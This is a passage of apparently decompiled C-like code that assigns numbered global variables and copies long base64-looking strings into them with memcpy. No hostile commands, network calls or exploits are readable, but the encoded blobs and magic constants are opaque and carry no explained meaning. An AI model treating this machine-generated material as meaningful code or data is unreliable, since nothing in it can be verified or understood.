ZJb/2RDuN+hIY6wCtZNTRLqn5g0IS3bHdIZZeBI2TuZsmNidiw0xbgBbBR7bJMpFFk5HN41YufB1uCsXly67Ex1FaMMHB0FoejOWsTPK/jVDwBliwqguSDzJRWK/1uoz55aWCR7ux0Yjxp3fEHgITZMj1q4yHiPfFL3c31lwoqp8CSSGMfqtFVuhCH8V2F/fV5J6KE6ArnLZs+GdscOUXQAg46tyOhgQYXwpvMrFOJfYphOxGSIpjw4ovTaz1IHdJYJp9CPAfS1jZwyOEg2QSREx99N8IUkJcSXnVVzDUUuJpws2fnPBt6rk7MwoGUs2j3nRxxm77wlZHTInHxJz2QqbsQGqKOMTmEOtwrUg+ZRAJJbBTJ9I+mFbDsZulqVDGrK80QV+dcARKE7F0PTFvZwAAttjgd3vOOhsBFvePugEd4Aame1goNc70x6Lb9FSGjRhO/NXxTLldTc3bh47SlfKRjiOcxRZOlOXrEdNUUSNwRWbsK3woSTj3FsP0eOy/Bs94RtL338bTcpVUBsu/SApl38h2FmRUZLNADvcmsNpd20MGUcBtoXz1qMpyrzGRY60wdFsCsvwiP5shGkqmJKh2tLo1g/2utoHAzhEPwh05oAxG4M1jYKxa7lUXqpdTAOgrsLgHFcp9hxN9PdrHAQaAr3kLbABSoknoza6/P7JURK3jZWBn+Ut8", 365);
    g273 = -0x38000000;
    g274 = 0x3f27eb36;
    *(int16_t *)&g275 = 0;
    g276 = g6;
    g277 = 1233;
    memcpy((char *)&g278, "/+3CmrNSY93T90CYblH3/arSy3/Ikpfppab7v/ttDltmWAYtUFrPXSAzzfZIbOuF76kg2Cxr6OmdaANIZv73EGYutwccQhLchwtdwE6wocqyfxD7d6UnbC+IJn84Hrp/IZl8/GMYHMaYujmbfmpDkuMrJVG9GFDyYtmMEoBed0AiRihI/19JQIvCeEER6Z0LS4orDQQB5LQcRHKUDXyiU8whdEYNVyve1MAWt/TjSAZNVoLog3MEfx2qlXZFKZkmmBch01PeIpzevpf9xdsPItHzzgBLiyk2PVZG5eOOjiyo6DysGdE8JHCwqJidXARxJG1+9nybvRj55sH2KMmgId7x7/L1HK6oVRC/h1frsvol3nVUaDdRa7jwmslNIRERnJbWQLwHQvbbgcZJl0aqNH6mWJ5QRK1t54d/Tu44oZ62xqmCgzVvDxe9ws1lxtW2urNSAlKN5pLn+nnG+xPt3grXpVnGk78g0IMobHc1dF+AtRYDOMoCfw+i8ANdrfp8W+UkvMNkHNySjWOI7NnaGBs/ZJb/2RDuN+hIY6wCtZNTRLqn5g0IS3bHdIZZeBI2TuZsmNidiw0xbgBbBR7bJMpFFk5HN41YufB1uCsXly67Ex1FaMMHB0FoejOWsTPK/jVDwBliwqguSDzJRWK/1uoz55aWCR7ux0Yjxp3fEHgITZMj1q4yHiPfFL3c31lwoqp8CSSGMfqtFVuhCH8V2F/fV5J6KE6ArnLZs+GdscOUXQAg46tyOhgQYXwpvMrFOJfYphOxGSIpjw4ovTaz1IHdJYJp9CPAfS1jZwyOEg2QSREx99N8IUkJcSXnVVzDUUuJpws2fnPBt6rk7MwoGUs2j3nRxxm77wlZHTInHxJz2QqbsQGqKOMTmEOtwrUg+ZRAJJbBTJ9I+mFbDsZulqVDGrK80QV+dcARKE7F0PTFvZwAAttjgd3vOOhsBFvePugEd4Aame1goNc70x6Lb9FSGjRhO/NXxTLldTc3bh47SlfKRjiOcxRZOlOXrEdNUUSNwRWbsK3woSTj3FsP0eOy/Bs94RtL338bTcpVUBsu/SApl38h2FmRUZLNADvcmsNpd20MGUcBtoXz1qMpyrzGRY60wdFsCsvwiP5shGkqmJKh2tLo1g/2utoHAzhEPwh05oAxG4M1jYKxa7lUXqpdTAOgrsLgHFcp9hxN9PdrHAQaAr3kLbABSoknoza6/P7JURK3jZWBn+Ut8", 308);
    *(char *)&g278 = 47;
    g279 = -0x80000000;
    g280 = 0x3ef58c14;
    *(int16_t *)&g281 = 0;
    g282 = g6;
    g283 = 1502;
    memcpy((char *)&g284, (char *)&g36, 375);
    *(int16_t *)&g284 = *(int16_t *)&g36;
    g285 = 0;
    g286 = 0x3ef8c0b0;
    *(int16_t *)&g287 = 0;
    g288 = g6;
    g289 = v3;
    memcpy((char *)&g290, "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", 365);
    g291 = -0x3a000000;
    g292 = 0x3f48ca2c;
    *(int16_t *)&g293 = 0;
    g294 = g6;
    g295 = 1233;
    memcpy((char *)&g296, "yyGsXRpF1mi20mnrxau9P+3M/yTl6Hy02KgZOaKv/JNxkk/GFg70MaDu88N94oeQzV8cOCpzoTCEeBrx8hTwj9TgrlgZvXze353pfSwVS5xFcPT+Gmp1E1TMadDs0nlbPlGBftJmUsG7mvQfgv4XYX0AMxz5YrqwGJfvTxKniphkH0HXhQlkKV0w/J/IVfQFQcGVrh3zZeE9PByrd7oxpyNSiXlIU9AUZp7WKzuVPIMQx3y4/g6QZbZprnHbUCiv9fVqYSj3+cwna2fn7kxdHqTGF13uO4uivs86us1LLjCZeiB4Zo4ih/2f4DNmcWoXHmb3FIWmNCm5LQM7Omt1BXKyaUyPUz5z0Z8HBNxhZNjepldrabniSaClovGr/IwlgOD8OqCcKqOiQaDknm42wYGpmiz9Cu9EJ4MlMXu7wK15mDoq8LjQGc/MIbd4tNUoGPn5IFTEgUW6WiWoOPPY8KQ1qDj+aj6+fa4nE110n8PKNq2bP7yT+4ECd9Lq+vZJ/M1sA3R0EgHrHbYwugIZ5pASDi2LnPObGl8cJS/UQHkDtSLetS2yWFfU+iWIDjRRevP/bhH772zLl3gQWvwbzNO9w3DwQXMnHYax5IGrteBE2MkVM6i+lIuARztgedFvit2bBEL60yH/3rW+nXGc8GWsIblQ60OLsm7guRTTIV4urL/7R1pUT5duqZDOd3XSXctur2mjI4s0yj0WJP7uKwyGdt2efzPBOc0lhwDbEzoBfYGbayxH4uzo2kVFaDMfqCsFNHOLesj2DEYYN+56MNjj9EyPeaKV6hjmvmVZaSqap4Id5bmE0ygYy4Yu8foJOgepheiUoBMJ6sEE2iJ+0kz0CiteZitgvfsY3Cw10DRvupMp14UrX43NWEZirinj+99Ay36xRs6KzpPiXRcpLbOwVY0pJPKj5UxZkG6tz5wziy0ZEsTLD0NQTA9lrxxCSQ0EupqyaW5flVuiVmD3PsIG0a6hkzNn9Ne/GJ5redmAF1DytSDWxoH4uEzdG2bN/Zlf9DW6pyBMblr3ZsZxjcLTG0dl2t+v+3k/uoWVsy9tm8c1GXe5UU6bmeQoTNckekNd1s6fIeK7wMaStu3KQjlan0TtuummxbBCHyRcwKcT6ImPlt+bk7No9m04cFBKFqZJYzYIjtGHUOgGMxsfdbjmSW3nClk98XpOoKug+2vcD0SBYrAZoqB4Mf/LLpWuZeYIbU+AEKZj2u6xb", 308);
    *(char *)&g296 = 121;
    g297 = 0;
    g298 = 0x3f058762;
    *(int16_t *)&g299 = 0;
    g300 = g6;
    g301 = 1502;
    memcpy((char *)&g302, (char *)&g37, 375);
    *(int16_t *)&g302 = *(int16_t *)&g37;
    g303 = 0x55200000;
    g304 = 0x3f913347;
    *(int16_t *)&g305 = 0;
    g306 = g6;
    g307 = v3;
    memcpy((char *)&g308, "OrCGJKRF/eSWAxdt2fCYjxVsuz1aKcKDOuorA3cQSrqHcUGwqS1EnJihmrqEDToYsJ6FFn8HVXyFx3sNjG+ndt3fN+rvtfE+dy78SV20LDDPQud3dgOBYCazITjwLBQwzRfrV46bgjicRPEg+yUP+Z8vrllvQ10vt2ZSp8fbE34qYy8XADCnaoZMW+f33aihngoLjhjFqocw9lTt4w50oDXTbte/5qtixa23W+KQXm5/GDIbl8ZuFCwhM2mh/Hp7AQ9Rflzw04SbSrcOUkFRhR4app8zC0ZMQDZAcPmbjUKhFdR96Y8Y/4xWNYxpFxyULYatK4EmKNXIPFxdMM7tD0rb92DoIhnm9srVDSZOALB8/LEqrH9Ki+n4AohAj5k3A/JzusC5/GwFGHU8fjMWWxwahhY9c5s2HyBdY+5nvis+E1CNZmNFjc030ALxM713Gu86+wNRzNCOXqAWnSUS2hQmgoxjD9GaSFa7L4xvEPeclBA1h5ceDjMB8dVCWFiwxPK5YbMs4L9uql12oNtrhfBwMRuYLqIA6UdAddKk/yHFyy9JqJXLrxoQdXAFXZ4GHtwaS2v6N/J38O8zMtD/ApsKYO6EB6GY1oGRyc1jw7VmzCKyT3j/Nd1+uMky+Nat8hpB1nvqKENzXkgRixdwa9H4nX0SYLhlDxvnEO/3BFG4umB/4DXuugYxuIF78KIgYrgwEHhEeO8Do0F69D38Phrnv2KbifOZsb1dTIPVvN2UyQtVzWmSo4bvd324HAbEl0jKMldCCiCaBLkHIkdUk/BEV16yzJQUXKuoPYnMZws5cLkv0pOaPvyVGyic+/gxZiUB0U0tZXBmv2jq9GE9XWJF26RCAl7V84WjzXAjx1KkmXa1VE5OeumfW7N6jOcRg5ERC1LgKiU8KZ0O1PnpwQKI2KiUhTzYVpeg81Q9qRi07RUiPKXC9mPwD2bwcFFKIUXPh8N2qq81SfFQZZY011hOcwAFNJIa9+ZWe7X/szRAhoLC0EDuqAozQDSrvQL6HH1TlE7vG8wQ3JcV1HUpzIwUCS8z7vW74TUSBtyIe16ystcJU7djeG0KCTSHR4IomXj21gAWBJ1KoYCP0DEla8VjRU/B14kOIuN8FTngqm3tqHnbvjSHGmj5pb/FMugBfNI1r6b6GIvs+f77Qrk+2Klg666tsvxAoP09zUU4mrbG3FA6UYmtE4wVlNsGl3mN9wD/PbHT7wW+EIZjY/rcdQjnRC2cBuBqtprm2VW7vZkbuFJGFw+xuTJpn2ZNO3mICoJRSzr9vMQVZ6ntlNK70imc7hJekUkLTg/voycWCazfNGX4kVPKKulSseJzg+RyjT/Fcn5dr66BsnKznEOauQ/jPtFRlpoTptketkqto4H2yRoNdw3p+jHUVaAYd0KWuQ5ACx3ISx68t7SX+n1LLtsB/UiwK9eEyLJEs92tUN3hAePoHQpUeKMqA66qFwypBXcJGo/DozC9ZpPdTTDWxm5QJCiG6cwVOyapdsttOPJ6M041u/ajk3fB9xJ5rNeRJvAnvC0G9TAWBirQNarF0510ha3xISYvyoLpwLF+eQxJN1E5Ezdhy10qQqJejfWelL0XdUu2jv0XaDg0mE0x+zgoxIpmKQIp7AMGyKYr7jhyYrmvswkb4gjYXnoQggTv2zYtHs6+Pf6x5eYVU+8yMG25loa2OIQ4JEjfDAJ+ihoiEQDrqj+L1/FzphXtqGvQkTx34OMOHgMNcasKdv96ykr7kDiDnmilhpek2gji9kju0pJFFcT/WdKy7jelCWuFMkBndIX8wlyGeaysOvYBBECd3eZ66npn8NWbz+z7hfQbR9LI2W9wO8TDCPCdkiYxM0AAYMz3iDaYhkcW73S5SSWLYnGm8I+S1c4hU7CKD84gEvn0vYZKE3dMKFvotZ/mMntRvIfX1ZuhRvmkD+PQyA5bRSyZicq0V2smJots3a2Fgv+/Znj9HbtMB62SdFfXBTkh6TOvVBigd6tD/FhXcBhnKOO3hxfxbekatKUmaLJfcc0XY9sjhdlOd72p8YNwAxY8I4JPm4KjjP9rRidIYd268eKpJrfSabnQl1pXICOmaXHI3JsleZU6xovShiyEBu2W/DtXh7XxhtCWyvRB6H1LJrce//t2eQI5lCh6Yj+BT5wD80g91YzO5y65ANi5bG1MgaX7fLkk2sIkdRfVrds/fFRp18Ru0TjDGtp56qCm+levn8ly7zR9hUIO3ecROVM3URLcpUagw8CromdrovaxV70KWJdAnZmLygbRIuSEn0SltQmAb5qC7BFIixqTjxDNvxo98ullF9qmwuyYmG6BUlmcDhnwJD2+cJtYfblgVNcrt8Y9W7+Jhzf9+h5xsfz3ScbSEmz42TyDa8lla2fMsQt8GOSSO/wFN00FVd+wuBcm0rGOv6VEZKJdpb9b4L/TRmZ3ltv6Cy7YXORpWRmhLXjHMyb2vYhy6F8KG8QUSpBt6JlA7Kwo9REui+EGCNHtWtQeFGu/rKcBMd1Sz5MF2uBLLOUa6snEous4C3Gsa6RD02aYO9aJxcvK2TvOneBOUArwewRgJJshizDUa/LVzLrA/HnaizLozZkat6ZH3pzGBQsXiZmNaXlXTVkAHn1Bu2Yx6bgtdFho9BjE40jabevewhaKDtl5QMUugNV189hxvkJshEFUAbIC/bK4s5ZMI", 365);
    g309 = -0x1c000000;
    g310 = 0x3f3fb4cc;
    *(int16_t *)&g311 = 0;
    g312 = g6;
    g313 = 1233;
    memcpy((char *)&g314, "eKMqA66qFwypBXcJGo/DozC9ZpPdTTDWxm5QJCiG6cwVOyapdsttOPJ6M041u/ajk3fB9xJ5rNeRJvAnvC0G9TAWBirQNarF0510ha3xISYvyoLpwLF+eQxJN1E5Ezdhy10qQqJejfWelL0XdUu2jv0XaDg0mE0x+zgoxIpmKQIp7AMGyKYr7jhyYrmvswkb4gjYXnoQggTv2zYtHs6+Pf6x5eYVU+8yMG25loa2OIQ4JEjfDAJ+ihoiEQDrqj+L1/FzphXtqGvQkTx34OMOHgMNcasKdv96ykr7kDiDnmilhpek2gji9kju0pJFFcT/WdKy7jelCWuFMkBndIX8wlyGeaysOvYBBECd3eZ66npn8NWbz+z7hfQbR9LI2W9wO8TDCPCdkiYxM0AAYMz3iDaYhkcW73S5SSWLYnGm8I+S1c4hU7CKD84gEvn0vYZKE3dMKFvotZ/mMntRvIfX1ZuhRvmkD+PQyA5bRSyZicq0V2smJots3a2Fgv+/Znj9HbtMB62SdFfXBTkh6TOvVBigd6tD/FhXcBhnKOO3hxfxbekatKUmaLJfcc0XY9sjhdlOd72p8YNwAxY8I4JPm4KjjP9rRidIYd268eKpJrfSabnQl1pXICOmaXHI3JsleZU6xovShiyEBu2W/DtXh7XxhtCWyvRB6H1LJrce//t2eQI5lCh6Yj+BT5wD80g91YzO5y65ANi5bG1MgaX7fLkk2sIkdRfVrds/fFRp18Ru0TjDGtp56qCm+levn8ly7zR9hUIO3ecROVM3URLcpUagw8CromdrovaxV70KWJdAnZmLygbRIuSEn0SltQmAb5qC7BFIixqTjxDNvxo98ullF9qmwuyYmG6BUlmcDhnwJD2+cJtYfblgVNcrt8Y9W7+Jhzf9+h5xsfz3ScbSEmz42TyDa8lla2fMsQt8GOSSO/wFN00FVd+wuBcm0rGOv6VEZKJdpb9b4L/TRmZ3ltv6Cy7YXORpWRmhLXjHMyb2vYhy6F8KG8QUSpBt6JlA7Kwo9REui+EGCNHtWtQeFGu/rKcBMd1Sz5MF2uBLLOUa6snEous4C3Gsa6RD02aYO9aJxcvK2TvOneBOUArwewRgJJshizDUa/LVzLrA/HnaizLozZkat6ZH3pzGBQsXiZmNaXlXTVkAHn1Bu2Yx6bgtdFho9BjE40jabevewhaKDtl5QMUugNV189hxvkJshEFUAbIC/bK4s5ZMI", 308);
    *(char *)&g314 = 101;
    g315 = -0x20000000;
    g316 = 0x3f07cacc;
    *(int16_t *)&g317 = 0;
    g318 = g6;
    g319 = 1502;
    memcpy((char *)&g320, (char *)&g38, 375);
    *(int16_t *)&g320 = *(int16_t *)&g38;
    g321 = 0x20000000;
    g322 = 0x3f1372ac;
    *(int16_t *)&g323 = 0;
    g324 = g6;
    g325 = v3;
    memcpy((char *)&g326, "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", 365);
    g327 = 0x70000000;
    g328 = 0x3f2af887;
    *(int16_t *)&g329 = 0;
    g330 = g6;
    g331 = 1233;
    memcpy((char *)&g332, "aDarhzDiYd09u2z9A7mdMUrgj73sfY57/Js9MbgLOoyQDHoSTGYgL5oNKD2i404mzzPg6w/ayLDGGAWTr16zxjcEHtbF6fKsNTHA3qRpsFTWSOd4p6hTpJ3XfD/+dxKr0kzu9xGBT/yn9H5AIHrS2nLzqILVSstzWV7mHaWiFxLshX/+r3O4jOVnAhF6ZflziFbf3NipUiWX7jJ7GAK/MD1c9Iwp8OOQkUtmkWvbfIm4DAvlfdU6u9gIwSF6occJdlmQpRSbFjSa+ozyh71UDvBdZOfQC+Ea35M9PDroP0dXkHrCL3zYnOEwoey0y0lnyw1vBkPmwl2pZ7Ue5+sFH4OW6uVLLuwucOk+HaixbXtbdQ49ozYeVb59oau8vt/hZHyHAHlo2GA3ftxH95kTkKdGtEbMfbdMxurHPTBKTm5MG6Y75759GekXc8YmxWD9nO5tFVaQvP8uRCt5q3hIycfQUnnzWBhAHD95r8ITOsP1f/USuQkXNdB+S1cevKIGnAvWBDPTKCZx0WleHC5gAS8r5qM/+GWmbqdGt4LcrgNQutixkgQh1jnDWCY0Td65cXHmKMYi4NRpgQu2Nyelth0SlOOalZtc8WGRFUrm2ZuCQpqSN9Z71t3PqXBOQIuQOvBm7DRt8LiOGWJ4Fgiw8zLUckIARWEUXUjklpNKgfWJR0DVxM6NGPBka6PlSXaaDn6cO35Likjr6hlVB8cOLTnmUzaUvSa3lR3RXRPG2rgZ3ARZALJ17t9dGs1u5EuNcl0UTmZ4FCpqYHadNm0frUnLz3f1VAHc/0/0jjEyMj+h4FMHHDslnvti7ajC1ws7EoOjVXfDV7GDyKJEr2CojIepkRTfLHNLMCd98YT1DYZRB/a8if3FzhYRMAZb1QKW9FiQi0HJra7eYXjA8cx4wZCq/M7XjTkXx6uSJUIGo45e6o6oE/PV/a18NryPB7YyO3tQz3BuSF3CKDxp3r4X+YgX+8yaQSKXmJVrXh3JLeSjtySsoYAUv49zfJVpmvsjXTXe1ZVXjg1dHXOB/286pHGYQsUSI1gPma99cJNVyLq/2NWfkvj67Kuu8gIuBOZpzsYvO8ZGSy4r+vj/kMIxyPqScm8n8oJmDkVyMvaSb/PIDjLf9gT41Zak2qiiobBtWWQlisXBNNLrx7VC9UYLDm4riZgYfVjvNI0DdSCzxwm880gSQghGcZDth6qfL//y/JWArPrY397u7IQDQ", 308);
    *(char *)&g332 = 97;
    g333 = 0x70000000;
    g334 = 0x3f1cafdb;
    *(int16_t *)&g335 = 0;
    g336 = g6;
    g337 = 1502;
    memcpy((char *)&g338, (char *)&g39, 375);
    *(int16_t *)&g338 = *(int16_t *)&g39;
    g339 = 0x4e200000;
    g340 = 0x3f920a9d;
    *(int16_t *)&g341 = 0;
    g342 = g6;
    g343 = v3;
    memcpy((char *)&g344, "lIUkxrAWFsPJ4KdaYRvhYs7ooFyXne1lLIjiQme58pzOPwLXfV8vUqhoJF8MY6UpsManUDeNyxs/U7oai/OQwgylCrIsuE9M0WnxJLkbzlUE0DjBKBejEK7vLOCJO4SVYLqVohoqajlPzOWDMnTu4Gzugp2BJY9Z9d6x/gsnGhXKKX/7W0YNdLYu48RVKJLWtO5MTf2k5FzjAn8V/lHLiGAl/V+YU/9kahQgBl1ufh2Y+aciOqhDYgPiSZIuLo+L0rQIrsDn4K2XP0SqNOUUwp2ZKok0gDg/1O8h7UMITpVrhQvkEMcrDODxVi6MslvkeBTOrY9Np1wlGMzRbJUYy3sdLj6ohcM03LJN33loVmAgUNPWVRAeV6F70tfdzgnUf98tJ6VvKV8QSEZR7gHFD958N9Ikb/zj66YdRI/SIUt3c+fEPxFLLmSmOGQ8Rbpl1ytuv02fEoG4PhU8kVJ5BUKldbtJG23VlkEmWTKy+q2y1/e7injMOYAaUFURFjKlBftp1I3QdaPuJRmjwwsMVPRLNoZOvWtD9HteHBrxPFrR9U8VZkx2ZOf0cKEYCsVTYygtI1L8M85VxaaHPkYDa2y0r+Sfxdv2tfXIIhg18+wT/Q9D6zU5pyzNiVJnxOcSKVzGtbH3dJW5zA0sNcBq6HhtHtaTDnSRs7Zdbi+j1PwnMdnUqyBm9cB/IJRrJOcvN6UA3tFo8WvyN5dlpXwd9gShYqzjT/gUuu4PTJzHjMIDzdTaaI8Z2pKOj3vUC+0gNrPSukoJlwB0viEMZLBZfzfj90MaC6WeuJW69cztT80wkyvkBTEpqYzWH7h7GksgQCTW02Ab1uMDRtKSo3A/chOzND96XcSYsvr3gMVpemh/kgOjaC+P4yPChHzc59